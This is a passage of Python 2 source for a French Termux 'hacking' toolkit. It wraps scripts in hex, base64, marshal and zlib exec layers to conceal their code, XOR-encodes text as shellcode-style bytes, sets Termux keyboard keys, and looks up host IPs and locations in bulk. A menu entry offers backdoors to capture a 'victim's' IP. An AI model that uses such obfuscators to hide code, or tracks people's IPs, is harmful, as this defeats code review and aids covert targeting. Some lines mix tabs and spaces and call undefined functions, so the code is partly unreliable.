            sauve_1.write('import binascii,base64\ng = ' + str(b) + "\ns = '" + str(e) + "'" + "\neval(compile(base64.b32decode(''.join([chr(i) for i in g])+binascii.unhexlify('%x' % int(s, 2))),'<faxel>','exec'))")
            sauve_1.close()
            py_compile.compile(resultat)
            ouverture2 = open(resultat + 'Mr').read()
            sauve_2 = open(resultat, 'w')
            sauve_2.write("#Compiler par Faxel\n#Twitter https://twitter.com/Faxel2020\nimport binascii, base64\n#REMARQUE : NE PAS MODIFIER SINON TOT OU TARD IL Y AURA UNE ERREUR FREQUENTE.\n\n" + ouverture2)
            sauve_2.close()	
	    print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Compilage reussi")
	    raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
	    menu_Faxel_cryptage()
####################################################################################################
####################################################################################################
def Menu_Hex():
     cls()
     print(logo6)
     horaire()
     print("\033[1;97m‚ïî"+30*"‚ïê"+1*"‚ïê‚ïó")
     print("\033[1;97m‚ïë \033[1;91m[\033[1;96m1.\033[1;91m]\033[38;5;241m Cryptage Hex        \033[1;92m‚àö \033[1;97m   ‚ïë")
     print("\033[1;97m‚ïë \033[1;91m[\033[1;96m2.\033[1;91m]\033[38;5;125m Cryptage Hex + Join \033[1;92m‚àö \033[1;97m   ‚ïë") 
     print("\033[1;97m‚ïë \033[1;91m[\033[1;96mP.\033[1;91m]\033[38;5;115m Menu Precedent        \033[1;97m   ‚ïë") 
     print("\033[1;97m‚ïë \033[1;91m[\033[1;96mM.\033[1;91m]\033[38;5;112m Menu General          \033[1;97m   ‚ïë")
     print("\033[1;97m‚ïö"+30*"‚ïê"+1*"‚ïê‚ïù")   
     print("\033[1;97m‚ïë")
     choix_hex()
def choix_hex():    
    dmd = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[38;5;245m Mr \033[38;5;221mFaxel \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;96m")
    if dmd =="":
        print ("\n\t\033[1;91m[\033[1;93m!\033[1;91m]\033[1;95m Remplissez correctement ")
	Menu_Hex()
    elif dmd =="1":
        Cryptage_Hex()
    elif dmd =="2":
        Cryptage_Hex_Join() 
    elif dmd =="p" or dmd =="P":
        menu_Faxel_cryptage()
    elif dmd =="m" or dmd =="M":
        menu()
    else: 
        print('\n\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m '+dmd+' \x1b[1;91mindisponible')
        raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
        Menu_Hex()
####################################################################################################
def Cryptage_Hex():
   cls()  
   charge()
   cls()
   print(logo6)
   script_Hex = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Entrer le nom du script a crypter \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
   print("\033[1;97m‚ïë")
   resultat = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Nommer le resultat du cryptage \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m") 
   ouverture = open(script_Hex).read()
   verife_hex = binascii.hexlify(ouverture)
   compression = '#Compiler par Faxel\n#Twitter : https://twitter.com/Faxel2020\nimport marshal , binascii, base64 , sys\n\nexec("{}").decode("hex")'.format(verife_hex)
   enregistrement = open(resultat, 'w')
   enregistrement.write(compression)
   enregistrement.close()
   print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Compilage reussi")
   raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
   Menu_Hex() 
####################################################################################################	
def Cryptage_Hex_Join():
   cls()  
   charge()
   cls()
   print(logo6)
   horaire()
   script_Hex_join = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Entrer le nom du script a crypter \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
   print("\033[1;97m‚ïë")
   resultat = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Nommer le resultat du cryptage \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m") 
   ouverture_1 = open(script_Hex_join).read()
   verife_hex = binascii.hexlify(ouverture_1)
   compression_premiere = '#Compiler par Faxel\n#Twitter : https://twitter.com/Faxel2020\nimport marshal , binascii, base64 , sys\n\nexec("{}").decode("hex")'.format(verife_hex)
   enregistrement_premier = open(resultat, 'w')
   enregistrement_premier.write(compression_premiere)
   enregistrement_premier.close()
   mael = []
   faxel = []
   ouverture_2 = open(resultat).read()
   for l in ouverture_2:
       mael.append(ord(l))
   for b in mael:
       faxel.append('f' * b)
   compression_final = '#Compiler par Faxel\n#Twitter : https://twitter.com/Faxel2020\nimport marshal , binascii, base64 , sys\n\nd={}\nexec("".join([chr(len(i)) for i in d]))'.format(faxel)
   enregistrement_final = open(resultat, 'w')
   enregistrement_final.write(compression_final)
   enregistrement_final.close()
   py_compile.compile(resultat)
   print("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Compilage reussi")
   raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
   Menu_Hex() 
####################################################################################################	
####################################################################################################
def menu_error_mz_fzxyl():
     cls()
     print(logo5)
     horaire()
     print("\033[1;97m‚ïî"+30*"‚ïê"+1*"‚ïê‚ïó")
     print("\033[1;97m‚ïë \033[1;91m[\033[1;96m1.\033[1;91m]\033[38;5;241m Error Zlim            \033[1;97m   ‚ïë")
     print("\033[1;97m‚ïë \033[1;91m[\033[1;96m2.\033[1;91m]\033[38;5;125m Error Mars Zlim       \033[1;97m   ‚ïë")      
     print("\033[1;97m‚ïë \033[1;91m[\033[1;96m3.\033[1;91m]\033[38;5;115m Error Shell Mars      \033[1;97m   ‚ïë") 
     print("\033[1;97m‚ïë \033[1;91m[\033[1;96m4.\033[1;91m]\033[38;5;136m Error Join Ordina     \033[1;97m   ‚ïë")
     print("\033[1;97m‚ïë \033[1;91m[\033[1;96mM.\033[1;91m]\033[38;5;112m Menu General          \033[1;97m   ‚ïë") 
     print("\033[1;97m‚ïö"+30*"‚ïê"+1*"‚ïê‚ïù")   
     print("\033[1;97m‚ïë")
     choix_error()
def choix_error():    
    dmd = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[38;5;245m Mr \033[38;5;221mFaxel \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;96m")
    if dmd =="":
        print ("\n\t\033[1;91m[\033[1;93m!\033[1;91m]\033[1;95m Remplissez correctement ")
	menu_error_mz_fzxyl()
    elif dmd =="1":
        error_zlim()
    elif dmd =="2":
        error_marzli() 
    elif dmd =="3":
        shell_mars() 
    elif dmd =="4":
        Join_ord()   
    elif dmd =="m" or dmd =="M":
        menu()
    else: 
        print('\n\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m '+dmd+' \x1b[1;91mindisponible')
        raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
        menu_error_mz_fzxyl()
####################################################################################################		
def error_zlim():
	cls()  
        charge()
        cls()
        print(logo5)
	script_mars = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Entrer le nom du script a crypter \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
	try:
		lecture = open(script_mars,'r').read()
	except IOError:
		print ("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Script introuvable")
		menu_error_mz_fzxyl()
	print("\033[1;97m‚ïë")
	resultat = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Nommer le resultat du cryptage \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
	load("\033[1;97mChargement\033[1;93m...")
	try:
		compression = base64.b16encode(mc.dumps(compile(lecture, '<string>', 'exec')))
		compresse = zlib.compress(compression)
		enregistrement = open(resultat,'w')
                enregistrement.write('#Compiler par Faxel\n#Twitter https://twitter.com/Faxel2020\nimport zlib, base64,marshal\nexec(marshal.loads(zlib.decompress(base64.b16decode(' + repr(compresse) + '))))')
		enregistrement.close()
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Compilage reussi")
		raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
		menu_error_mz_fzxyl()
	except:
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;94m Compilage echouer")
		raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
                menu_error_mz_fzxyl()
####################################################################################################
def error_marzli():
	cls()  
        charge()
        cls()
        print(logo5)
	script_mars = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Entrer le nom du script a crypter \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
	try:
		lecture = open(script_mars,'r').read()
	except IOError:
		print ("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Script introuvable")
		menu_error_mz_fzxyl()
	print("\033[1;97m‚ïë")
	resultat = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Nommer le resultat du cryptage \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
	load("\033[1;97mChargement\033[1;93m...")
	try:
		compression = base64.b16encode(mc.dumps(compile(lecture, '<string>', 'exec')))
		compresse = zlib.compress(compression)
		enregistrement = open(resultat,'w')
                enregistrement.write('#Compiler par Faxel\n#Twitter https://twitter.com/Faxel2020\nimport zlib, base64,marshal\nexec(marshal.loads(zlib.decompress(' + repr(compresse) + ')))')
		enregistrement.close()
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Compilage reussi")
		raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
		menu_error_mz_fzxyl()
	except:
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;94m Compilage echouer")
		raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
                menu_error_mz_fzxyl()
#################################################################################################### 
def shell_mars():
     cls()
     load("\033[1;97mChargement\033[1;93m...")
     cls()
     print(logo1)
     Texte = raw_input('\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂ \033[1;95mSaisissez votre texte\033[1;91m \n\t\033[1;97m ') 	    
     coder1 = ""
     coder2 = ""
     print ('Nombre de caractere de mot saisi: %d' % len(bytearray(Texte)))
     print ('Codage en Shell.......')
     time.sleep(2)
     i = 11
     for x in bytearray(Texte) :
	     if  i == 16:
		     i = 11
	     y = x^i
	     coder1 += '\\x'
	     coder1 += '%02x' % y
	     coder2 += '0x'
	     coder2 += '%02x,' %y	
	     i = i + 0x01	
     print (coder1)
     print (coder2)
     print ('Nombre de caractere en shell avec la methode simple  : %d' % len(bytearray(coder1)))
     print ('Nombre de caractere en shell avec la methode complexe: %d' % len(bytearray(coder2)))
     raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
     menu_error_mz_fzxyl() 
####################################################################################################	
def Join_ord():
    cls()
    load("\033[1;97mSi vous utilser se ce Join, vous ne pourriez pas le lancer. Merci\033[1;93m...")
    cls()
    print(logo)
    script = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Entrer le nom du script a crypter \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
    print("\033[1;97m‚ïë")
    resultat = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Nommer le resultat du cryptage \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")    
    lecture = open(script).read()
    compresse =("\\x" + "\\x".join("{0:x}".format(ord(lecture)) for lecture in lecture))
    save = open(resultat, 'w')
    save.write("#Compiler par Faxel\n#Twitter https://twitter.com/Faxel2020\nimport base64\nexec('" + compresse + "')")
    save.close()
    raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
    menu_error_mz_fzxyl()
    #print("\n‚ô†‚ô†‚ô†‚ô†‚ô†‚ô†‚ô†‚ô† logo_term_key shellcode =('" + compresse + "'); exec(shellcode)")
####################################################################################################
####################################################################################################
def menu_clavier():	
           cls()
	   print(logo_menu_clavier)
	   horaire()
	   print("\033[38;5;214müá®üáÆ\033[1;97m I'm the person whom you can never judge. \033[1;92m üá®üáÆ")
	   print("\033[1;97m‚ïî"+29*"‚ïê"+1*"‚ïê‚ïó")
	   print("\033[1;97m‚ïë\033[1;91m--> \033[1;92m1. \033[38;5;245m Clavier simple        \033[1;97m‚ïë")
	   print("\033[1;97m‚ïë\033[1;91m--> \033[1;92m2. \033[38;5;214m Clavier semi-complet  \033[1;97m‚ïë")
	   print("\033[1;97m‚ïë\033[1;91m--> \033[1;92m3. \033[38;5;112m Clavier complet       \033[1;97m‚ïë")
	   print("\033[1;97m‚ïë\033[1;91m--> \033[1;92mM. \033[38;5;115m Retour au menu        \033[1;97m‚ïë" ) 
	   print("\033[1;97m‚ïö"+29*"‚ïê"+1*"‚ïê‚ïù")
	   print("\x1b[1;97m‚ïë")
           choix_clavier()	   
def choix_clavier():	
	dmd = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[38;5;245m Mr \033[38;5;221mFaxel \033[1;31m‚ñ∂‚ñ∂‚ñ∂  \033[1;33m")
	if dmd =="":
		print("\033[1;91m[\033[1;93m!\033[1;91m]\033[1;91m Mauvaise entree\033[1;91m!")
		menu_clavier()
	elif dmd =="1" or dmd =="01":
		clavier_simple()	
	elif dmd =="2" or dmd =="02":		
		clavier_semi_complet()	
	elif dmd =="3" or dmd =="03":			
		clavier_complet()
        elif dmd =="m" or dmd =="M":		
		menu()		
	else:
		print('\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + dmd + ' \x1b[1;91mindisponible')
	        menu_clavier()
####################################################################################################
def clavier_simple():
	cls()
        print(key_simple)
        print(50 * '\033[1;97m\xe2\x95\x90')
        load("\033[1;91m[\033[1;97m*\033[1;91m]\033[1;97m D√©but du processus ....")
        load("\033[1;91m[\033[1;97m+\033[1;91m]\033[1;92m Cr√©ation d\'un repertoire de propri√©t√©s termux..\n")
        try:
              os.mkdir('/data/data/com.termux/files/home/.termux')
        except:
              pass
        print("\033[1;91m[\033[1;97m*\033[1;91m]\033[1;92m R√©ussie !")
        load("\033[1;91m[\033[1;97m+\033[1;91m]\033[1;97m Cr√©ation du fichier d\'installation..")
        Faxel = "extra-keys = [['F1','F2','F3','F4','F5','F6','F12'],['ESC','TAB','CTRL','_','-','DOWN','UP']]"
        ouvert = open('/data/data/com.termux/files/home/.termux/termux.properties','w')
        ouvert.write(Faxel)
        ouvert.close()
        print("\033[1;91m[\033[1;97m*\033[1;91m]\033[1;92m Installation de clavier simple r√©ussie \033[1;97m !")
        sleep(1.5)
        print("\033[1;91m[\033[1;97m!\033[1;91m]\033[1;97m Mise en place de clavier simple..")
        os.system('termux-reload-settings')
        print("\033[1;91m[\033[1;97m*\033[1;91m]\033[1;92m Mise en place de clavier simple r√©ussie \033[1;97m !! ")
        print(50 * '\033[1;97m\xe2\x95\x90')
        print("[38;5;214müá®üáÆ\033[1;97m I'm the person whom you can never judge. \033[1;92m üá®üáÆ")
        raw_input('\n\x1b[1;91m[ \x1b[1;97mRetour \x1b[1;91m]')
        menuclavier()	
####################################################################################################
def clavier_semi_complet():
	cls()
        print(key_semi)
        print(50 * '\033[1;97m\xe2\x95\x90')
        load("\033[1;91m[\033[1;97m*\033[1;91m]\033[1;97m D√©but du processus ....")
        load("\033[1;91m[\033[1;97m+\033[1;91m]\033[1;92m Cr√©ation d\'un repertoire de propri√©t√©s termux..\n")
        try:
              os.mkdir('/data/data/com.termux/files/home/.termux')
        except:
              pass
        print("\033[1;91m[\033[1;97m*\033[1;91m]\033[1;92m R√©ussie !")
        load("\033[1;91m[\033[1;97m+\033[1;91m]\033[1;97m Cr√©ation du fichier d\'installation..")
        Mael = "extra-keys = [['ESC','/','-','HOME','UP','ENTER'],['TAB','CTRL','ALT','LEFT','DOWN','RIGHT','DEL'],['END','<>',':','//','&&','\']]"
        ouvert = open('/data/data/com.termux/files/home/.termux/termux.properties','w')
        ouvert.write(Mael)
        ouvert.close()
        print("\033[1;91m[\033[1;97m*\033[1;91m]\033[1;92m Installation du clavier semi-complet r√©ussie \033[1;91m!\n")
        sleep(1.5)
        print("\033[1;91m[\033[1;97m!\033[1;91m]\033[1;97m Mise en place..")
        os.system('termux-reload-settings')
        print("\033[1;91m[\033[1;97m*\033[1;91m]\033[1;92m Mise en place du clavier semi-complet r√©ussie \033[1;91m!\n")
        print(50 * '\033[1;97m\xe2\x95\x90')
        mael("\n            \033[1;92m Information utile sur clavier semi-complet\n")
        mael("\033[1;93m¬´\033[1;94m&&\033[1;93m¬ª \033[1;91m‚Üí\033[1;97m Traduit un et entre plusieurs mots")
        mael("\033[1;93m¬´\033[1;94m<>\033[1;93m¬ª \033[1;91m‚Üí\033[1;97m Lorsqu'une phrase est longue, se symbole permet un retour a la ligne")
        print(50 * '\033[1;97m\xe2\x95\x90')
        print("\n\033[38;5;214müá®üáÆ\033[1;97m I'm the person whom you can never judge. \033[1;92m üá®üáÆ")
        raw_input('\n\x1b[1;91m[ \x1b[1;97mRetour \x1b[1;91m]')
        menu_clavier()	
####################################################################################################
def clavier_complet():
	cls()
        print(key_complet)
        print(50 * '\033[1;97m\xe2\x95\x90')
        load("\033[1;91m[\033[1;97m*\033[1;91m]\033[1;97m D√©but du processus ....")
        load("\033[1;91m[\033[1;97m+\033[1;91m]\033[1;92m Cr√©ation d\'un repertoire de propri√©t√©s termux..\n")
        try:
              os.mkdir('/data/data/com.termux/files/home/.termux')
        except:
              pass
        print("\033[1;91m[\033[1;97m*\033[1;91m]\033[1;92m R√©ussie!")
        load("\033[1;91m[\033[1;97m+\033[1;91m]\033[1;97m Cr√©ation du fichier d'installation..")
        clavier = "extra-keys = [['ESC','HOME','-','UP','ALT','END','BKSP'],['TAB','|','LEFT','CTRL','RIGHT','PGDN','ENTER'],['//',':','\','DOWN','/','_','DEL']]"
        ouvert = open('/data/data/com.termux/files/home/.termux/termux.properties','w')
        ouvert.write(clavier)
        ouvert.close()
        print("\033[1;91m[\033[1;97m*\033[1;91m]\033[1;92m Installation du clavier complet r√©ussie\033[1;91m!")
        sleep(1.5)
        print("\033[1;91m[\033[1;97m!\033[1;91m]\033[1;97m Mise en place du clavier complet")
        os.system('termux-reload-settings')
        print("\033[1;91m[\033[1;97m*\033[1;91m]\033[1;92m Mise en place du clavier complet r√©ussie\033[1;91m!")
        print(50 * '\033[1;97m\xe2\x95\x90')
        mael("\n            \033[1;92m Information utile sur clavier complet\n")
        mael("\033[1;93m¬´\033[1;94mPGDN\033[1;93m¬ª \033[1;91m‚Üí\033[1;97m Symbole environ")
        mael("\033[1;93m¬´\033[1;94mESC \033[1;93m¬ª \033[1;91m‚Üí\033[1;97m Sortie")
        print(50 * '\033[1;97m\xe2\x95\x90')
        print("\n\033[38;5;214müá®üáÆ\033[1;97m I'm the person whom you can never judge. \033[1;92m üá®üáÆ")
        raw_input('\n\x1b[1;91m[ \x1b[1;97mRetour \x1b[1;91m]')
        menu_clavier()		
####################################################################################################
####################################################################################################
############################        üÑºüÑ¥üÑΩüÖÑ üÑ∞üÖÑüÖÉüÖÅüÑ¥üÖÇ üÖÇüÑ≤üÖÅüÑ∏üÑøüÖÉüÖÇ        ################################
####################################################################################################
####################################################################################################
def Menu_autres_scripts():
	cls()
	horaire()
	print("\033[38;5;214m‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë\033[1;97m‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë€©€©‡πë‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚óè‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨\033[1;32m‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë€©€©‡πë‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚óè")             
        print("\033[38;5;214m‚Ä¢_  _ ____ \033[1;97m _  _ ____ ____ _  _\033[1;32m ____ ____   _  _‚Ä¢ ")
        print("\033[38;5;214m‚Ä¢|\/| |__/ \033[1;97m |__| |__| |    |_/ \033[1;32m |___ |__/   |_/ ‚Ä¢ ")
        print("\033[38;5;214m‚Ä¢|  | |  \ \033[1;97m |  | |  | |___ | \_\033[1;32m |___ |  \ __| \_‚Ä¢ ")    
	print("\033[38;5;214m‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë\033[1;97m‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë€©€©‡πë‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚óè‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨\033[1;32m‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë€©€©‡πë‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚óè")
	print("\t\033[38;5;214m \033[1;31m  [\033[1;37m++\033[1;31m]\033[042m \033[1;37m Cod√© par\033[1;31m : \033[38;5;245m Mr \033[38;5;247mFaxel\033[1;31m [\033[1;37m++\033[1;31m] \033[00m")
	print("\033[1;97m‚ïî"+27*"‚ïê"+1*"‚ïê‚ïó")
	print("\033[1;97m‚ïë \033[1;91m[\033[1;96m1.\033[1;91m]\033[38;5;136m Menu Ip-Track    \033[1;97m     ‚ïë")
	print("\033[1;97m‚ïë \033[1;91m[\033[1;96m2.\033[1;91m]\033[38;5;115m Menu Ip-Tracer   \033[1;97m     ‚ïë")
	print("\033[1;97m‚ïë \033[1;91m[\033[1;96m3.\033[1;91m]\033[38;5;141m Robot Force pas  \033[1;97m     ‚ïë")
	print("\033[1;97m‚ïë \033[1;91m[\033[1;96m4.\033[1;91m]\033[38;5;245m Auteur           \033[1;97m     ‚ïë") 
	print("\033[1;97m‚ïë \033[1;91m[\033[1;96mM.\033[1;91m]\033[38;5;212m Menu General     \033[1;97m     ‚ïë") 
	print("\033[1;97m‚ïë \033[1;91m[\033[1;96mQ.\033[1;91m]\033[38;5;125m Quitter          \033[1;97m     ‚ïë")
	print("\033[1;97m‚ïö"+27*"‚ïê"+1*"‚ïê‚ïù")   
	print("\033[1;97m‚ïë")
	choix_autres_scripts()
def choix_autres_scripts():
        choisir=raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[38;5;245m Mr \033[38;5;221mFaxel \033[1;31m‚ñ∂‚ñ∂‚ñ∂ \033[1;33m")	
        if choisir ==" ":
                print("\033[1;91m[\033[1;93m!\033[1;91m]\033[1;94m Remplissez correctement\033[1;91m!")
                Menu_autres_scripts()	
        elif choisir =="1":
        	menu_ip()		
        elif choisir =="2":
        	menu_ipt()
        elif choisir =="3":
        	menu_robot_force_pas()
        elif choisir =="4":
        	menu_auteur()
        elif choisir =="m" or choisir =="M":
        	menu()
        elif choisir =="q" or choisir =="Q":
        	arret()
        else: 
                print('\n\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m '+choisir+' \x1b[1;91mindisponible')
                raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
                Menu_autres_scripts()	
####################################################################################################
####################################################################################################
def menu_ip():	
	cls()
	print(logo_menu_ip)
	horaire()
	print("[38;5;214müá®üáÆ\033[1;97m I'm the person whom you can never judge. \033[1;92m üá®üáÆ")
	print("\033[1;31m  [\033[1;37m++\033[1;31m]\033[1;37m Cod√© par\033[1;31m :[48;5;0;38;5;158m Mr[38;5;212m Hacker_K\033[1;31m [\033[1;37m++\033[1;31m]\n")
	print("\033[1;97m‚ïî"+61*"‚ïê"+1*"‚ïê‚ïó")
	print("\033[1;97m‚ïë \033[1;91m[\033[1;96m1.\033[1;91m][48;5;0;38;5;197m H√¥te d\'ecoulement de masse vers IP avec Web liste.\033[1;97m      ‚ïë")
	print("\033[1;97m‚ïë \033[1;91m[\033[1;96m2.\033[1;91m][48;5;0;38;5;158m IP unique\033[1;91m/[48;5;0;38;5;158mnom d\'h√¥te.\033[1;97m                                   ‚ïë")
	print("\033[1;97m‚ïë \033[1;91m[\033[1;96m3.\033[1;91m][38;5;114m V√©rifier mon adresse IP publique.\033[1;97m                       ‚ïë")
	print("\033[1;97m‚ïë \033[1;91m[\033[1;96m4.\033[1;91m][38;5;74m Generer des portes derob√©es Py pour obtenir l\'adresse \033[1;97m, ‚ïë")
	print("\033[1;97m‚ïë \033[1;91m[\033[1;96m‚Ü™Ô∏è.\033[1;91m][38;5;74m IP de la victime publique.\033[1;97m                              ‚ïë") 
	print("\033[1;97m‚ïë \033[1;91m[\033[1;96m5.\033[1;91m][38;5;210m Emplacement de vidage √† partir de l\'adresse IP publique.\033[1;97m‚ïë")
	print("\033[1;97m‚ïë \033[1;91m[\033[1;96m6.\033[1;91m][48;5;0;38;5;198m Liens de page d\'extraction en masse √† partir de l\'h√¥te.\033[1;97m ‚ïë")
	print("\033[1;97m‚ïë \033[1;91m[\033[1;96m7.\033[1;91m][38;5;118m Menu pirate\033[1;97m.                                            ‚ïë")
	print("\033[1;97m‚ïë \033[1;91m[\033[1;96m0.\033[1;91m][38;5;199m Retour au menu general\033[1;97m.                                 ‚ïë")
	print("\033[1;97m‚ïö"+61*"‚ïê"+1*"‚ïê‚ïù")   
	print("\033[1;97m‚ïë")
	choisir_ip()      		
def choisir_ip():	
	choisir = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂[38;5;245m Mr [38;5;221mFaxel \033[1;31m‚ñ∂‚ñ∂‚ñ∂  \033[1;33m")
	if "1" in choisir:		
		cls()
		print(logo_menu_ip)
		hote = raw_input(' [+] WEB LISTE  \033[1;31m‚ñ∂‚ñ∂‚ñ∂ \033[1;37m ')
		try:
			word = open(hote).readlines()
			resultats = len(word)
			print(" [*] "+str(resultats)+" Hote charger!")
			print(" [*] Vidage IP de "+hote+" \n")
			ouverture = open(hote)
			for moi in range(resultats):
				remplacement = ouverture.readline().replace('\n','')
				try:
					mael = requests.get('http://ip-api.com/json/'+remplacement+'')
					ant = json.loads(mael.text)
					try:
						print(" [+] "+remplacement+" ‚óè‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚óÑ‚ñ∫ ",ant["query"])
					except:
						print(" [-] "+remplacement+" ‚óè‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚óÑ‚ñ∫ Inconnu!")
				except:
					print(" [-] Verifier votre connexion!")
					raw_input(' [+] Appuyer entrer pour retourner au menu...')
					menu_ip()
			print("\n  [*] Terminer.")
			raw_input('  [+] Appuyer entrer pour retourner au menu...')	
			menu_ip()
		except:
			print(" [-] Oh merde! Liste '"+hote+"'non trouver.")
			raw_input(' [+] Appuyer entrer pour retourner au menu...')
			menu_ip()		
	elif "2" in choisir:
		cls()
		print(logo_menu_ip)
		horaire()
		cible = raw_input('  [+] IP cible\033[1;31m/\033[1;34mNom de l\'hote \033[1;31m ‚ñ∂‚ñ∂‚ñ∂ \033[1;37m  ')
		print("[38;5;214müá®üáÆ\033[1;97m I'm the person whom you can never judge. \033[1;92m üá®üáÆ")
		print("\033[1;97m‚ïî"+50*"‚ïê"+1*"‚ïê‚ïó")
		print("\033[1;97m‚ïë             \033[1;91m[\033[1;96m Hote de \033[1;92m"+cible+"\033[1;91m] \033[1;97m                         ‚ïë")
		print("\033[1;97m‚ïë						     \033[1;97m‚ïë")
		print("\033[1;97m‚ïë\033[1;91m[\033[1;96m1.\033[1;91m]\033[1;97m Obtenez Ip de \033[1;92m"+cible+"      \033[1;97m               ‚ïë")
		print("\033[1;97m‚ïë\033[1;91m[\033[1;96m2.\033[1;91m]\033[1;97m Obtenez l\'h√¥te + IP de \033[1;92m"+cible+"   \033[1;97m        ‚ïë")
		print("\033[1;97m‚ïë\033[1;91m[\033[1;96m3.\033[1;91m]\033[1;97m Obtenez l\'h√¥te + IP + LOCATION de \033[1;92m"+cible+"\033[1;97m‚ïë")
		print("\033[1;97m‚ïë						     \033[1;97m‚ïë")
		print("\033[1;97m‚ïö"+50*"‚ïê"+1*"‚ïê‚ïù")
		print("\033[1;97m‚ïë")
		choix = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂[38;5;245m Mr [38;5;221mFaxel \033[1;31m‚ñ∂‚ñ∂‚ñ∂  \033[1;33m")
		if "1" in choix:
			os.system('clear')
		        print(logo_hote)
			print("  [*] Obtenez Ip de "+cible+" ...\n")
			try:
				print("  [+] IP : ", requests.get('http://ip-api.com/json/'+cible+'').json()["query"])
			except:
				print("\n [-] Verifier votre connexion internet!")
				raw_input(' [+] Appuyer entrer pour retourner au menu...')
				menu_ip()
			print (" [*] Terminer.")
			raw_input(' [+] Appuyer entrer pour retourner au menu...')
			menu_ip()
		elif "2" in choix:
		        cls()
		        print(logo_hote)
			print(" [*] Obtenez l\'h√¥te + IP de "+cible+" ...")
